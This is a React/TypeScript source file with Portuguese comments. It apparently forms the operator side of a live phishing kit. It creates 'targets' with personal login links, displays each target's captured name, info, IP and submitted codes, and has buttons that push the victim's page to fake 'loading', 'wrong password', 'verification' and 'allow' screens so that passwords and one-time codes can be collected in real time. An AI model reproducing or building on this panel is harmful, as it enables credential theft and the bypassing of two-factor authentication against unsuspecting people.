import React, { useEffect, useState } from "react";
import { TargetProvider, useTarget } from "../contexts/target.context";
import { CreateTargetDto } from "../rules/interfaces/target.interfaces";
import { playerLogin } from "../fetchs/player.fetch";
import { newCodeRequest } from "../fetchs/codes.fetch";

const BASE_URL = import.meta.env.VITE_T_URL || "http://localhost:5174";
const SELF_URL = import.meta.env.VITE_P_BASE_URL || "http://localhost:5175";

// ---------- NewTarget ----------
export function NewTarget() {
  const { createTarget, loading, targetId, setTargetId } = useTarget();

  async function handleNewTarget() {
    const token = localStorage.getItem("token") || "";
    const playerId = localStorage.getItem("playerId") || "";
    if (!playerId) {
      alert("Player não encontrado. Faça login novamente.");
      return;
    }

    const dto: CreateTargetDto = { playerId, page: 0 };
    try {
    const created = await createTarget(dto, token); // Provider já cria e retorna

    setTargetId(created.id); // atualiza o estado do Provider
    localStorage.setItem("targetId", created.id); // salva no storage
  } catch (err) {
      console.error("Erro ao criar target:", err);
      alert("Não foi possível criar o target");
    }
  }


  if (targetId) return null; // já tem target criado

  return (
    <div style={{ marginBottom: "1rem" }}>
      <button onClick={handleNewTarget} disabled={loading}>
        {loading ? "Criando..." : "Novo Target"}
      </button>
    </div>
  );
}


// ---------- TargetControl ----------
export function TargetControl() {
  const { targetId, targetData, targetPage, targetStatus, updateTarget } = useTarget();

  if (!targetId || !targetData) return <p>Nenhum Target ativo</p>;

  const { name, info, codes, details } = targetData;

  const link = `${BASE_URL}/login/${targetId}`;

   let resp: any = null;

  return (
    <div>
      <h2>Controle do Target</h2>
      <p><b>ID:</b> {targetId}</p>
      <p><b>Nome:</b> {name || "—"}</p>
      <p><b>Info:</b> {info || "—"}</p>
      <p><b>Details/IP:</b> {details || "—"}</p>
      <p><b>Status:</b> {targetStatus}</p>
      <p><b>Página:</b> {targetPage}</p>

      <br />

      <p><b>Link de Acesso:</b> <a href={link} target="_blank" rel="noopener noreferrer">{link}</a></p>

      <br /><br />
  
      <br />

      {/* Codes */}
      {codes && codes.length > 0 && (
        <div style={{ marginTop: "1rem" }}>
          <h3>Códigos:</h3>
          <ul>
            {codes.map((c) => (
              <li key={c.id}>
                {c.codev || "Sem código"} → {c.value || "Sem valor"} (status {c.status})
              </li>
            ))}
          </ul>
        </div>
      )}

      {/* Botões de controle */}
      <div style={{ marginTop: "1rem" }}>
        {/* Sempre disponível para teste */}
        <button onClick={() => updateTarget(targetId, { status: 3 })}>Pausar</button>
        <button onClick={() => updateTarget(targetId, { status: 4 })}>Parar</button>

        {/* Botões de navegação de página */}
        <hr style={{ margin: "1rem 0" }} />
        <button onClick={() => updateTarget(targetId, { page: 1 })}>Loading</button>
        <button onClick={() => updateTarget(targetId, { page: 2 })}>Erro de Senha</button>
        <button onClick={async () => {
          updateTarget(targetId, { page: 3 });
          try {
            const resp = await newCodeRequest(targetId, "");
            console.log("Clicou no botão de verificação, resposta:", resp);
          } catch (err) {
            console.error("Erro ao criar novo code:", err);
          }
        }}>Verificação</button>
        <button onClick={() => updateTarget(targetId, { page: 4 })}>Permitir</button>
        <button onClick={() => updateTarget(targetId, { page: 5 })}>Requisitar</button>
      </div>
    </div>
  );
}

// ---------- Funções do Control ----------
export function CodeBox(targetId: string) {
  console.log('Ta no Botão de verificação!!')
  console.log("Target ID no CodeBox: ", targetId);
  const { currentCodeId, setCurrentCodeId, updateTarget } = useTarget();
  console.log("quebrou depois do Target");
  updateTarget(targetId, { page: 3 })
  console.log("quebrou depois do update");
  newCodeRequest(targetId, "").then((res) => {
    console.log("Novo code criado no CodeBox: ", res);
    setCurrentCodeId(res.id)
  }).catch((err) => {
    console.error("Erro ao criar novo code no CodeBox: ", err);
  });
}


// ---------- Wrapper que alterna ----------
export function TargetWrapper() {
  const { targetId } = useTarget();
  return targetId ? <div><TargetControl /><br /><NewTarget /></div> : <div><NewTarget /></div>;
}


// ==============


export function TargetInfos() {
  const { targetId, targetData, targetPage, targetStatus } = useTarget()

  if (!targetId || !targetData) return null

  const { name, info } = targetData

  return (
    <div style={{ marginTop: "1rem", padding: "1rem", border: "1px solid #ccc", borderRadius: "8px" }}>
      <h2>Informações do Target</h2>
      <p><b>ID:</b> {targetId}</p>
      <p><b>Nome:</b> {name || "—"}</p>
      <p><b>Info:</b> {info || "—"}</p>
      <p><b>Status:</b> {targetStatus}</p>
      <p><b>Página:</b> {targetPage}</p>
    </div>
  )
}